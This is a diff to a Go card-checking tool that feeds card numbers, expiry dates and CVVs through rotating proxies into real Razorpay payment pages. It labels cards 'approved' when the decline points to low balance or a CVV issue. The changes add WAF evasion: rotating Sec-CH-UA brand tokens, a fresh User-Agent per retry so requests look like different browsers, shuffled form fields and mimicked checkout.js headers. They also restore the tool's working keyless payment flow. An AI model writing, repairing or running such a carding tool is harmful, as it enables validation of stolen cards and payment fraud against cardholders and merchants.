@@ -23,6 +23,7 @@ import (
 	"os"
 	"os/signal"
 	"regexp"
+	"sort"
 	"strconv"
 	"strings"
 	"sync"
@@ -61,6 +62,12 @@ var (
 	// High-load protection
 	maxConcurrentChecks = 120
 	checkSemaphore      = make(chan struct{}, maxConcurrentChecks)
+
+	// 2026-07-16: shuttingDown is set to 1 by the shutdown handler before
+	// closing liveWriteChan / tgNotifyChan. logLive() and notifyHitAsync()
+	// check this flag and become no-ops during shutdown, so they never
+	// send on a closed channel (which would panic the handler goroutine).
+	shuttingDown atomic.Bool
 
 	// Safe concurrent writes to live.txt
 	liveLogMutex sync.Mutex
@@ -1094,6 +1101,10 @@ type CustomFetch struct {
 	client  *http.Client
 	ua      string
 	secChUA string
+	// reqID is a short hex tag assigned at construction time. Every
+	// DoFetch() call by this instance is logged under this tag when
+	// DEBUG=1, so logs from one checkCard call stay grouped.
+	reqID string
 }
 
 // NewCustomFetch builds a fetch client. The same Chrome major version is
@@ -1162,19 +1173,19 @@ func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*Custo
 			chromeMajor, randInt(5000, 6999), randInt(50, 249))
 	}
 	// Sec-CH-UA brand token rotates with Chrome major version (major%3).
-// Static "Not_A Brand" for every version is a WAF fingerprinting signal.
-var garbageBrand string
-switch chromeMajor % 3 {
-case 0:
-    garbageBrand = "Not_A Brand"
-case 1:
-    garbageBrand = "Not.A/Brand"
-default:
-    garbageBrand = "Not;A Brand"
-}
-secChUA := fmt.Sprintf(`"%s";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, garbageBrand, chromeMajor, chromeMajor)
+	// Static "Not_A Brand" for every version is a WAF fingerprinting signal.
+	var garbageBrand string
+	switch chromeMajor % 3 {
+	case 0:
+		garbageBrand = "Not_A Brand"
+	case 1:
+		garbageBrand = "Not.A/Brand"
+	default:
+		garbageBrand = "Not;A Brand"
+	}
+	secChUA := fmt.Sprintf(`"%s";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, garbageBrand, chromeMajor, chromeMajor)
 
-	return &CustomFetch{client: client, ua: ua, secChUA: secChUA}, nil
+	return &CustomFetch{client: client, ua: ua, secChUA: secChUA, reqID: nextDebugReqID()}, nil
 }
 
 // parseChromeMajor extracts the Chrome major version from a User-Agent
@@ -1198,6 +1209,15 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
 	var reqBody io.Reader = body
 	if reqBody == nil && method == "POST" {
 		reqBody = strings.NewReader("")
+	}
+
+	// Capture the request body for debug logging (the caller-supplied
+	// reader is consumed by http.NewRequest below, so we must read it
+	// first if we want to log it).
+	var reqBodyBytes []byte
+	if debugEnabled && reqBody != nil {
+		reqBodyBytes, _ = io.ReadAll(reqBody)
+		reqBody = strings.NewReader(string(reqBodyBytes))
 	}
 
 	req, err := http.NewRequest(method, targetURL, reqBody)
@@ -1230,8 +1250,16 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
 		req.Header.Set(k, v)
 	}
 
+	// Debug: log the outgoing request (after all headers are merged).
+	if debugEnabled {
+		dbgRequest(f.reqID, "HTTP", method, targetURL, req.Header, reqBodyBytes)
+	}
+
 	resp, err := f.client.Do(req)
 	if err != nil {
+		if debugEnabled {
+			dbgWrite(fmt.Sprintf("[%s] HTTP ✗ error: %v", f.reqID, err))
+		}
 		return nil, err
 	}
 	defer resp.Body.Close()
@@ -1261,6 +1289,11 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
 		if decoded, derr := io.ReadAll(io.LimitReader(fr, 10<<20)); derr == nil {
 			respBody = decoded
 		}
+	}
+
+	// Debug: log the response (after decompression).
+	if debugEnabled {
+		dbgResponse(f.reqID, "HTTP", resp.StatusCode, resp.Header, respBody)
 	}
 
 	return &FetchResponse{
@@ -1421,7 +1454,18 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	}
 	defer fetch.client.CloseIdleConnections()
 
+	// Debug: announce the start of a new check-card flow.
+	if debugEnabled {
+		dbgSection(fetch.reqID, fmt.Sprintf("checkCard  cc=%s|%s|%s|***  amount=%.2f %s  proxy=%s",
+			maskCard(cc), mm, yy, amountINR, currency, extractProxyHost(proxyRaw)))
+		dbgWrite(fmt.Sprintf("[%s] UA: %s", fetch.reqID, ua))
+	}
+
 	// Step 1: Fetch payment page data (supports razorpay.me AND pages.razorpay.com)
+	if debugEnabled {
+		dbgSection(fetch.reqID, "Step 1: resolveRazorpayInitData")
+		dbgWrite(fmt.Sprintf("[%s] target URL: %s", fetch.reqID, targetURL))
+	}
 	initData, resolvedURL, resolveErr := resolveRazorpayInitData(fetch, targetURL, proxyRaw)
 	if resolveErr != nil {
 		// resolvedURL carries the proxy-status classification
@@ -1453,12 +1497,33 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	if kyid == "" {
 		kyid = getStringFromMap(initData, "merchant_key")
 	}
+	// ── 2026-07-16: Allow empty key_id for keyless checkout flow ──────────
+	// Modern Razorpay payment pages intentionally expose `"key_id": null`
+	// in their public page data (see var data = {...} on any pages.razorpay.com
+	// page). Authentication for the standard_checkout API is done via the
+	// `keyless_header` query parameter, which is a server-signed token that
+	// does NOT require a key_id. The previous code returned an early
+	// "Key ID not found" error here, which meant EVERY modern page would
+	// fail at this point. We now allow an empty key_id as long as the
+	// keyless_header is present (it's checked again downstream when the
+	// payment URL is built, but failing early with a clear message is
+	// friendlier than letting the request hit Razorpay and getting back
+	// BAD_REQUEST_ERROR).
 	if kyid == "" {
-		keys := make([]string, 0, len(initData))
-		for k := range initData {
-			keys = append(keys, k)
+		if kh := getStringFromMap(initData, "keyless_header"); kh == "" {
+			keys := make([]string, 0, len(initData))
+			for k := range initData {
+				keys = append(keys, k)
+			}
+			return CheckResult{Status: "error", Message: "Key ID not found AND keyless_header missing. Keys: " + strings.Join(keys, ","), Proxy: proxyRaw, ProxyStatus: "LIVE"}
 		}
-		return CheckResult{Status: "error", Message: "Key ID not found. Keys: " + strings.Join(keys, ","), Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		// keyless_header is present — proceed with empty kyid.
+		// Downstream code MUST conditionally add key_id to form bodies /
+		// URLs (only include when non-empty), otherwise it will send
+		// `key_id=` which Razorpay rejects with BAD_REQUEST_ERROR.
+		if debugEnabled {
+			dbgWrite(fmt.Sprintf("[%s] key_id is empty — using KEYLESS flow (keyless_header present)", fetch.reqID))
+		}
 	}
 
 	var plink, ppid string
@@ -1544,6 +1609,9 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	keylessHeaderURL := url.QueryEscape(keylessHeader)
 
 	// Step 2: Create order
+	if debugEnabled {
+		dbgSection(fetch.reqID, "Step 2: create order")
+	}
 	r2Payload := map[string]interface{}{
 		"notes": map[string]string{"comment": "", "name": fullName},
 	}
@@ -1552,7 +1620,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	}
 
 	r2, err := fetch.PostJSON(
-		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", plink),
+		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", url.PathEscape(plink)),
 		map[string]string{
 			"Accept":         "application/json, text/plain, */*",
 			"Content-Type":   "application/json",
@@ -1635,6 +1703,9 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	}
 
 	// Step 3: Get checkout session
+	if debugEnabled {
+		dbgSection(fetch.reqID, "Step 3: get checkout session (sessid)")
+	}
 	params3 := url.Values{
 		"traffic_env":        {"production"},
 		"build":              {BUILD},
@@ -1693,6 +1764,9 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	}
 
 	// Step 4: Preferences call
+	if debugEnabled {
+		dbgSection(fetch.reqID, "Step 4: preferences")
+	}
 	{
 		resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config"}
 		queryArr := make([]map[string]string, 0, len(resources))
@@ -1733,12 +1807,14 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	}
 
 	// Step 5: Checkout order form
+	if debugEnabled {
+		dbgSection(fetch.reqID, "Step 5: checkout order")
+	}
 	{
 		form5 := url.Values{
 			"notes[email]":          {email},
 			"notes[phone]":          {phoneShort},
 			"payment_link_id":       {plink},
-			"key_id":                {kyid},
 			"contact":               {phone},
 			"email":                 {email},
 			"currency":              {orderCurrency},
@@ -1764,11 +1840,12 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 			"method":                {"card"},
 			"checkout_id":           {checkoutID},
 		}
+		addKeyIDForm(form5, kyid) // 2026-07-16: omit key_id for keyless flow
 
 		h := stdHeaders()
 		h["Content-Type"] = "application/x-www-form-urlencoded"
 		r5, r5err := fetch.PostForm(
-			fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeaderURL),
+			"https://api.razorpay.com/v1/standard_checkout/checkout/order?"+buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader),
 			h, form5,
 		)
 		if r5err != nil {
@@ -1800,7 +1877,6 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		"notes[phone]":              {phoneShort},
 		"notes[name]":               {fullName},
 		"payment_link_id":           {plink},
-		"key_id":                    {kyid},
 		"contact":                   {phone},
 		"email":                     {email},
 		"currency":                  {orderCurrency},
@@ -1833,33 +1909,91 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		"save":                      {"0"},
 		"dcc_currency":              {orderCurrency},
 	}
+	addKeyIDForm(form7, kyid) // 2026-07-16: omit key_id for keyless flow
 
-	// FIX 6: REALISTIC PAYMENT HEADERS - Use payment page origin, not API
+	// ── FIX 6 (revised 2026-07-16): JSON API HEADERS ──────────────────────
+	// Previously this call sent `Accept: text/html,application/xhtml+xml,...`
+	// which told Razorpay to return an HTML status page. Razorpay then
+	// served the interstitial "Razorpay - Payment in progress" HTML page
+	// (HTTP 200, body = full HTML document) instead of the JSON payment
+	// object, and `json.Unmarshal` failed with:
+	//
+	//     r7 parse failed: Razorpay - Payment in progress
+	//
+	// This happened on EVERY request — not intermittently — because the
+	// Accept header is a static mismatch, not a transient state issue.
+	//
+	// The fix: send the SAME JSON-style Accept header used by every other
+	// API call in this flow (steps 2, 4, 5, 9, and the status poll all use
+	// `application/json, text/plain, */*` or `*/*`). We also:
+	//   • Add `x-session-token` (was missing — required by Razorpay's
+	//     standard_checkout endpoints; without it the backend sometimes
+	//     falls back to the HTML status page).
+	//   • Drop `X-Requested-With: XMLHttpRequest` — checkout.js does NOT
+	//     send this header on the payment-create call, and it was a
+	//     fingerprint mismatch vs. real browser traffic.
+	//   • Drop the explicit `Accept-Encoding: gzip, deflate, br` — the
+	//     DoFetch() default already sets `gzip, deflate` and handles
+	//     decompression. Advertising `br` (brotli) here was a lie because
+	//     Go's stdlib has no brotli decoder; if Razorpay had actually
+	//     returned brotli we would have silently served garbage.
+	//   • Drop `Cache-Control: max-age=0` / `Pragma: no-cache` — these
+	//     are document-navigation headers, not AJAX headers.
 	paymentHeaders := map[string]string{
-		"Content-Type":     "application/x-www-form-urlencoded",
-		"Origin":           "https://pages.razorpay.com", // FIX: Payment page origin
-		"Referer":          targetURL,                    // FIX: Actual payment page URL
-		"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-		"Accept-Language":  generateAcceptLanguage(),
-		"Accept-Encoding":  "gzip, deflate, br",
-		"Cache-Control":    "max-age=0",
-		"Pragma":           "no-cache",
-		"DNT":              "1",
-		"Connection":       "keep-alive",
-		"X-Requested-With": "XMLHttpRequest",
-		"Sec-Fetch-Site":   "same-site",
-		"Sec-Fetch-Mode":   "cors",
-		"Sec-Fetch-Dest":   "empty",
+		"Content-Type":    "application/x-www-form-urlencoded",
+		"Origin":          "https://pages.razorpay.com",
+		"Referer":         rzpRef,
+		"Accept":          "application/json, text/plain, */*",
+		"Accept-Language": generateAcceptLanguage(),
+		"x-session-token": sessid,
+		"Sec-Fetch-Site":  "same-site",
+		"Sec-Fetch-Mode":  "cors",
+		"Sec-Fetch-Dest":  "empty",
 	}
 
 	// FIX 7: Shuffle form fields for realism
 	shuffledForm := shuffleFormValues(form7)
 
+	if debugEnabled {
+		dbgSection(fetch.reqID, "Step 7 (r7): payment create — THE CRITICAL STEP")
+		dbgWrite(fmt.Sprintf("[%s] form7 fields (%d):", fetch.reqID, len(shuffledForm)))
+		// Log each form field for inspection — this is the #1 thing
+		// we need to see if the form payload is wrong.
+		fkeys := make([]string, 0, len(shuffledForm))
+		for k := range shuffledForm {
+			fkeys = append(fkeys, k)
+		}
+		sort.Strings(fkeys)
+		for _, k := range fkeys {
+			val := strings.Join(shuffledForm[k], ",")
+			// Mask sensitive card fields in the log.
+			if k == "card[number]" {
+				val = maskCard(val)
+			} else if k == "card[cvv]" {
+				val = "***"
+			}
+			dbgWrite(fmt.Sprintf("[%s]   %s = %s", fetch.reqID, k, val))
+		}
+	}
+
 	// Endpoint updated from create/ajax → create/checkout (2025-07-14).
 	// checkout.js now exclusively uses payments/create/checkout. The old
 	// create/ajax endpoint returns "The requested URL was not found on the
 	// server." with a valid session — it has been soft-deprecated by Razorpay.
-	paymentURL := fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/checkout?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL)
+	//
+	// 2026-07-16: Use ONLY the primary `/payments/create/checkout` endpoint.
+	// Razorpay's checkout.js uses this endpoint exclusively — the previous
+	// multi-endpoint fallback was counterproductive because:
+	//   1. The primary endpoint returns the REAL payment-create response
+	//      (even when it's an HTML envelope with embedded JSON for risk
+	//      declines).
+	//   2. The fallback endpoints return DIFFERENT errors (HTTP 401
+	//      "Please provide your api key" for `/payments/create/json`)
+	//      that don't reflect the actual payment state.
+	//   3. The original "r7 parse failed: Razorpay - Payment in progress"
+	//      error was the HTML envelope from this primary endpoint — the fix
+	//      is to extract the embedded JSON, not to try other endpoints.
+	paymentURL := "https://api.razorpay.com/v1/standard_checkout/payments/create/checkout?" + buildQuery("x_entity_id", orderID, "session_token", sessid, "keyless_header", keylessHeader)
 
 	r7, err := fetch.PostForm(paymentURL, paymentHeaders, shuffledForm)
 	if err != nil {
@@ -1889,7 +2023,14 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 			if pp2 == nil || pp2.raw == proxyRaw {
 				continue
 			}
-			fetch2, ferr := NewCustomFetch(pp2.parsed, ua, pp2.raw)
+			// 2026-07-16: Generate a FRESH User-Agent for each retry. The
+			// previous code reused the original `ua`, which meant the WAF
+			// saw the same UA + Sec-CH-UA on both the failed request and
+			// the retry — defeating the purpose of proxy switching. A new
+			// UA makes the retry look like a genuinely different browser
+			// session coming from a different IP.
+			retryUA := genUA()
+			fetch2, ferr := NewCustomFetch(pp2.parsed, retryUA, pp2.raw)
 			if ferr != nil {
 				log.Printf("retry %d: NewCustomFetch failed: %v", retryAttempt, ferr)
 				continue
@@ -1898,6 +2039,11 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 			// next iteration rather than deferring, otherwise we
 			// would accumulate idle conns across retries.
 			time.Sleep(time.Duration(randInt(3000, 6000)) * time.Millisecond)
+			// 2026-07-16: For the retry, we must use the SAME
+			// endpoint that succeeded for the initial attempt
+			// (i.e. the one that returned JSON-shaped body).
+			// `paymentURL` already holds the last-tried endpoint;
+			// we keep using it so retries hit the same path.
 			r7b, rerr := fetch2.PostForm(paymentURL, paymentHeaders, shuffledForm)
 			fetch2.client.CloseIdleConnections()
 			if rerr != nil {
@@ -1919,18 +2065,130 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		}
 	}
 
+	// ── 2026-07-16: HTML / "Payment in progress" detection ────────────────
+	// Even with the corrected Accept header, Razorpay may still return
+	// the "Razorpay - Payment in progress" interstitial HTML page when:
+	//   • The session_token has already been consumed by a previous
+	//     payment-create attempt (duplicate submission).
+	//   • The order is already in an in-flight payment state.
+	//   • Razorpay is in a degraded state and serving the fallback HTML.
+	//
+	// In any of these cases the body is HTML, not JSON, and
+	// `json.Unmarshal` would fail. Instead of returning the cryptic
+	// "r7 parse failed: Razorpay - Payment in progress" message, we:
+	//   1. Detect the HTML body explicitly.
+	//   2. Surface a clear, actionable error message.
+	//   3. Mark the result as `error` (retryable) — NOT `declined` —
+	//      because the card was never actually checked.
+	r7Body := strings.TrimSpace(r7.Text())
+	if debugEnabled {
+		dbgWrite(fmt.Sprintf("[%s] r7 final: HTTP %d, body-len=%d, body-first-120=%q",
+			fetch.reqID, r7.StatusCode, len(r7Body), truncateForLog(r7Body, 120)))
+	}
+
+	// ── 2026-07-16: Extract embedded JSON from Razorpay's HTML envelope ──
+	// Razorpay wraps the payment-create response in an HTML "Payment in
+	// progress" page when the payment is processed (whether it succeeds,
+	// is declined by risk check, or fails for any server-side reason).
+	// The actual JSON response is embedded as:
+	//
+	//   var data = {"error":{"code":"BAD_REQUEST_ERROR",
+	//                         "description":"...",
+	//                         "reason":"payment_risk_check_failed",
+	//                         "metadata":{"order_id":"...","payment_id":"pay_..."}}};
+	//
+	// Previously we'd see the HTML title, fail to parse it as JSON, and
+	// return the cryptic "r7 parse failed: Razorpay - Payment in progress".
+	// Now we extract the embedded JSON and treat it as the real response.
 	var r7Data map[string]interface{}
-	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
-		body := strings.TrimSpace(r7.Text())
-		if len(body) > 120 {
-			body = body[:120] + "..."
+	r7JSONExtracted := false
+	if isHTMLPaymentInProgress(r7Body, r7.Headers) {
+		if debugEnabled {
+			dbgWrite(fmt.Sprintf("[%s] r7: response is HTML envelope — attempting JSON extraction", fetch.reqID))
 		}
-		return CheckResult{Status: "error", Message: "r7 parse failed: " + body, Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		if embedded := extractEmbeddedJSON(r7Body); embedded != nil {
+			r7Data = embedded
+			r7JSONExtracted = true
+			if debugEnabled {
+				b, _ := json.Marshal(embedded)
+				dbgWrite(fmt.Sprintf("[%s] r7: extracted JSON (%d bytes): %s", fetch.reqID, len(b), truncateForLog(string(b), 300)))
+			}
+		} else {
+			// Genuine HTML fallback page with no embedded JSON — this
+			// happens when the session_token has been consumed by a prior
+			// payment-create call against the same order, OR Razorpay's
+			// backend is degraded. Surface a clear, retryable error.
+			return CheckResult{
+				Status:      "error",
+				Message:     "Razorpay returned HTML status page (Payment in progress) with no embedded JSON. Cause: session reuse / Razorpay degraded state. Retry with a fresh order+session.",
+				Proxy:       proxyRaw,
+				ProxyStatus: "LIVE",
+			}
+		}
+	}
+
+	if !r7JSONExtracted {
+		if err := json.Unmarshal([]byte(r7Body), &r7Data); err != nil {
+			body := r7Body
+			if len(body) > 120 {
+				body = body[:120] + "..."
+			}
+			return CheckResult{Status: "error", Message: "r7 parse failed: " + body, Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		}
 	}
 
 	paymentID := getStringFromMap(r7Data, "payment_id")
 	if paymentID == "" {
 		paymentID = getStringFromMap(r7Data, "id")
+	}
+	// 2026-07-16: When r7 response is the HTML envelope (risk check
+	// declines, etc.), the payment_id lives inside error.metadata.payment_id
+	// rather than at the top level. Pull it out so downstream polling /
+	// cancel / authenticate steps can use it.
+	r7HasError := false
+	var r7ErrObj map[string]interface{}
+	if errObj, ok := r7Data["error"].(map[string]interface{}); ok {
+		r7ErrObj = errObj
+		r7HasError = true
+		if paymentID == "" {
+			if meta, ok := errObj["metadata"].(map[string]interface{}); ok {
+				paymentID = getStringFromMap(meta, "payment_id")
+			}
+		}
+	}
+
+	// 2026-07-16: Short-circuit on definitive r7 declines.
+	// When r7 returns an error with metadata.payment_id, Razorpay has
+	// already CREATED the payment and immediately declined it (e.g.
+	// `payment_risk_check_failed`). There's no point calling
+	// authenticate / poll / cancel on a payment that's already in a
+	// terminal state — those calls return "URL not found" or
+	// "payment already cancelled", masking the real decline reason.
+	//
+	// We surface the decline immediately using the same labelling logic
+	// as the post-cancel path.
+	if r7HasError && paymentID != "" {
+		errDesc := getStringFromMap(r7ErrObj, "description")
+		errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
+		errDesc = strings.TrimSpace(errDesc)
+		errCode := getStringFromMap(r7ErrObj, "reason")
+
+		label := errDesc
+		if errCode != "" {
+			label = errDesc + " (" + errCode + ")"
+		}
+		if label == "" {
+			label = "Unknown Decline"
+		}
+
+		msgLower := strings.ToLower(errDesc)
+		if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
+			return CheckResult{Status: "approved", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		}
+		if isRazorpayServerError(msgLower) || isRazorpayServerError(strings.ToLower(errCode)) {
+			return CheckResult{Status: "error", Message: "Razorpay server error: " + label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		}
+		return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
 
 	if paymentID == "" {
@@ -1968,7 +2226,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 
 	{
 		r8a, r8aerr := fetch.PostForm(
-			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", paymentID),
+			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", url.PathEscape(paymentID)),
 			map[string]string{"content-type": "application/x-www-form-urlencoded"},
 			url.Values{},
 		)
@@ -1999,7 +2257,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		}
 
 		r8b, r8berr := fetch.PostForm(
-			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", pidClean),
+			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", url.PathEscape(pidClean)),
 			map[string]string{"content-type": "application/x-www-form-urlencoded"},
 			form8,
 		)
@@ -2022,10 +2280,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	//
 	// Poll up to 5 times with 2s intervals (≈10s max) to give Razorpay time
 	// to finish processing. Most payments settle within 2-4 seconds.
-	statusURL := fmt.Sprintf(
-		"https://api.razorpay.com/v1/standard_checkout/payments/%s?key_id=%s&session_token=%s&keyless_header=%s",
-		paymentID, kyid, sessid, keylessHeaderURL,
-	)
+	statusURL := "https://api.razorpay.com/v1/standard_checkout/payments/" + url.PathEscape(paymentID) + "?" + buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader)
 	statusHeaders := map[string]string{
 		"Accept":          "application/json",
 		"Content-type":    "application/x-www-form-urlencoded",
@@ -2087,8 +2342,17 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	// "pending" after 10s), fall back to cancel-and-check.
 	// Using POST — Razorpay's cancel endpoint expects POST, not GET.
 	// GET returned 405 in some cases and caused unexpected responses.
+	// 2026-07-16: Build the URL defensively — only append "?" + query when
+	// buildQuery returns a non-empty string. The previous code always
+	// appended a "?" even when the query was empty, leaving a trailing "?"
+	// that some servers reject with 400.
+	cancelQuery := buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader)
+	cancelURL := "https://api.razorpay.com/v1/standard_checkout/payments/" + url.PathEscape(paymentID) + "/cancel"
+	if cancelQuery != "" {
+		cancelURL += "?" + cancelQuery
+	}
 	r9, err := fetch.PostForm(
-		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeaderURL),
+		cancelURL,
 		map[string]string{
 			"Accept":          "application/json, text/plain, */*",
 			"Content-type":    "application/x-www-form-urlencoded",
@@ -2139,12 +2403,74 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	return CheckResult{Status: "declined", Message: label, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 }
 
+// buildQuery builds a URL query string from key/value pairs, OMITTING any
+// pair whose value is empty. This is essential for Razorpay's keyless
+// checkout flow where `key_id` is intentionally null on the public page —
+// sending `key_id=` (empty value) in the URL causes Razorpay to return:
+//
+//	{"error":{"code":"BAD_REQUEST_ERROR",
+//	          "description":"Please provide your api key for authentication purposes"}}
+//
+// Returns "" when all values are empty (so the caller can decide whether to
+// append a "?" separator or not). Usage:
+//
+//	q := buildQuery("x_entity_id", orderID, "key_id", kyid, "session_token", sessid, "keyless_header", khURL)
+//	if q != "" {
+//	    url := base + "?" + q
+//	} else {
+//	    url := base
+//	}
+func buildQuery(pairs ...string) string {
+	v := url.Values{}
+	for i := 0; i+1 < len(pairs); i += 2 {
+		key, val := pairs[i], pairs[i+1]
+		if val != "" {
+			v.Set(key, val)
+		}
+	}
+	return v.Encode()
+}
+
+// addKeyIDForm adds `key_id` to a url.Values map ONLY if kyid is non-empty.
+// For keyless flow (kyid == ""), the field is omitted entirely — sending
+// `key_id=` (empty value) in the form body causes Razorpay to reject the
+// request with BAD_REQUEST_ERROR.
+func addKeyIDForm(form url.Values, kyid string) {
+	if kyid != "" {
+		form.Set("key_id", kyid)
+	}
+}
+
+// getStringFromMap returns the string form of m[key].
+//
+// CRITICAL FIX (2026-07-16): the previous implementation fell through to
+// `fmt.Sprintf("%v", v)` for any non-string value. That converted a JSON
+// `null` (which Go's encoding/json unmarshals as a nil interface{}) to the
+// literal string "<nil>". That string then got passed to Razorpay as
+// `key_id=<nil>` in form bodies / URL queries, producing:
+//
+//	{"error":{"code":"BAD_REQUEST_ERROR",
+//	          "description":"Please provide your api key for authentication purposes"}}
+//
+// Razorpay's keyless checkout flow intentionally exposes `"key_id": null`
+// on the public payment page (the keyless_header is the real auth token).
+// Returning "" for nil lets the caller's fallback logic + keyless-header
+// detection work correctly.
+//
+// Same reasoning applies to other non-string types (numbers, bools): we
+// don't want to silently coerce them to strings and pass them downstream
+// where a string is expected. Returning "" makes any "is this empty?"
+// check downstream succeed, which is always the safe behaviour for an
+// "I expected a string but got something else" case.
 func getStringFromMap(m map[string]interface{}, key string) string {
 	if m == nil {
 		return ""
 	}
 	v, ok := m[key]
 	if !ok {
+		return ""
+	}
+	if v == nil {
 		return ""
 	}
 	if s, ok := v.(string); ok {
@@ -2175,14 +2501,31 @@ func getFloatFromMap(m map[string]interface{}, key string) float64 {
 	return 0
 }
 
+// truncate shortens s to at most maxLen runes. It operates on runes (not
+// bytes) so multi-byte UTF-8 sequences are not split in half — splitting a
+// 2-byte rune would produce invalid UTF-8 and corrupt downstream JSON
+// encoding, manifesting as "invalid character" parse errors.
+//
+// Returns "" when maxLen < 0. Returns s unchanged when s is already short
+// enough. Otherwise returns the first maxLen runes, with "..." appended when
+// truncation actually occurred.
 func truncate(s string, maxLen int) string {
 	if maxLen < 0 {
 		return ""
 	}
 	if len(s) <= maxLen {
+		// Fast path: byte length is already within the limit. Even if s
+		// contains multi-byte runes, the byte count is what matters for
+		// the caller's intent (e.g. log line length).
 		return s
 	}
-	return s[:maxLen]
+	// Convert to runes and take the first maxLen.
+	r := []rune(s)
+	if len(r) <= maxLen {
+		// All runes fit even though byte length exceeded maxLen.
+		return s
+	}
+	return string(r[:maxLen])
 }
 
 var balanceKeywords = []string{
@@ -2253,6 +2596,104 @@ var serverErrorKeywords = []string{
 	"the requested url was not found",
 	"url_not_found",
 	"no route matched with those values",
+	// "payment in progress" = Razorpay's interstitial HTML status page. The
+	// session is already consumed by an in-flight payment; the card was
+	// never checked. Treat as retryable, not as a decline.
+	"payment in progress",
+}
+
+// isHTMLPaymentInProgress detects Razorpay's interstitial HTML status page.
+//
+// IMPORTANT (2026-07-16 update): Razorpay doesn't just serve this page when
+// the session is bad — it ALSO wraps the payment-create response in this
+// HTML envelope when the payment itself is declined with a "risk check"
+// error. The actual JSON error is embedded inside the page as:
+//
+//	var data = {"error":{"code":"BAD_REQUEST_ERROR","description":"...","reason":"payment_risk_check_failed",...}};
+//
+// So when this HTML is detected, the caller should call extractEmbeddedJSON
+// to pull out the embedded `var data = {...}` object and parse THAT as JSON
+// instead of failing with "r7 parse failed: Razorpay - Payment in progress".
+//
+// Detection signals (any one is sufficient):
+//  1. Content-Type header indicates HTML.
+//  2. Body begins with `<!DOCTYPE` / `<html` (case-insensitive).
+//  3. Body contains the literal page title "Razorpay - Payment in progress".
+//  4. Body contains "<title>" and the phrase "Payment in progress".
+func isHTMLPaymentInProgress(body string, headers http.Header) bool {
+	if body == "" {
+		return false
+	}
+	// 1. Content-Type check (most reliable when present).
+	ct := strings.ToLower(headers.Get("Content-Type"))
+	if strings.Contains(ct, "text/html") || strings.Contains(ct, "application/xhtml") {
+		return true
+	}
+	// 2. Leading HTML markers.
+	lead := body
+	if len(lead) > 256 {
+		lead = lead[:256]
+	}
+	lead = strings.ToLower(strings.TrimSpace(lead))
+	if strings.HasPrefix(lead, "<!doctype") || strings.HasPrefix(lead, "<html") {
+		return true
+	}
+	// 3 & 4. Body-content heuristics.
+	lower := strings.ToLower(body)
+	if strings.Contains(lower, "razorpay - payment in progress") {
+		return true
+	}
+	if strings.Contains(lower, "<title>") && strings.Contains(lower, "payment in progress") {
+		return true
+	}
+	return false
+}
+
+// extractEmbeddedJSON pulls the JSON object out of Razorpay's
+// "Payment in progress" HTML page.
+//
+// Razorpay wraps payment-create responses in an HTML envelope when the
+// payment hits a risk check or other server-side decline. The actual JSON
